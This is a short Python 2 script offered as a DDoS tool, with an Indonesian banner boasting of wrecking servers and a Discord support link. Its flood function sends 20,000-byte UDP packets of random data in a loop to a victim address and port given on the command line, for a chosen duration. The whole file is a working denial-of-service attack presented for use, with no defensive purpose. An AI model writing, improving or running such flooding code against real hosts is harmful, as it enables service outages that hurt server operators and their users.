import time
import socket
import random
import sys
def usage():
    print "\033[1;91mDDOS ORANGYANGTERSAKITI VERSI BETA"
    print "\033[1;91m[+] command python2 Orangyangtersakiti.py"
    print "\033[1;91m[+] support https://discord.gg/BM8WUNVn"
    print "\033[1;91m[+] Saatnya Orang Yang Di Dianggap noob menjadi pengrusak server"
    print "\33[0;32m     Member:all members who contributed to creating this tool"
    print "\33[0;32m           PembuatDdos1:Orang yang Tersakiti"
    print "\33[0;32m          PembuatDdos2:Orang Yang Tersakiti"
    time.sleep(5)
    print "\033[1;91[                    ] 0% "
    time.sleep(5)
    print "\033[1;91[==========          ] 50%"
    time.sleep(5)
    print "\033[1;91[===============     ] 75%"
    time.sleep(5)
    print "\033[1;91[====================] 100%"
    time.sleep(3)
def flood(victim, vport, duration):
    # Support us yaakk... :)
    # Okey Jadi disini saya membuat server, Ketika saya memanggil "SOCK_DGRAM" itu  menunjukkan  UDP type program
    client = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    # 20000 representasi satu byte ke server
    bytes = random._urandom(20000)
    timeout =  time.time() + duration
    sent = 30000000000
    # Berapa lama ddos berjalan
    while 1:
        if time.time() > timeout:
            break
        else:
            pass
        client.sendto(bytes, (victim, vport))
        sent = sent + 1
        print "\033[1;91mMemulai \033[1;32m%s \33[36;1mmengirim paket \033[1;32m%s \033[1;91mpada port \033[1;32m%s "%(sent, victim, vport)
def main():
    print len(sys.argv)
    if len(sys.argv) != 4:
        usage()
    else:
        flood(sys.argv[1], int(sys.argv[2]), int(sys.argv[3]))

if __name__ == '__main__':
    main()

